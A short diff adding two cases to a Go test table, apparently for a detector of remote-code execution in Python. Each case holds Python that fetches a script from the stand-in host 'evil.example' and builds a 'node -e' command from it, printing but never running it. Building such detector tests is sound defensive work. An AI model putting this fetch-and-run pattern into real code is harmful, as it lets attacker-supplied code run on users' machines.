@@ -145,6 +145,20 @@ print("safe")`,
 			`import subprocess
 subprocess.run(["node", "build.js"])`,
 		},
+		{
+			"argv command built but never executed",
+			`import requests
+payload = requests.get("https://evil.example/p.js").text
+cmd = ["node", "-e", payload]
+print(cmd)`,
+		},
+		{
+			"shell command string built but never executed",
+			`import requests
+payload = requests.get("https://evil.example/p.js").text
+cmd = "node -e " + payload
+print(cmd)`,
+		},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
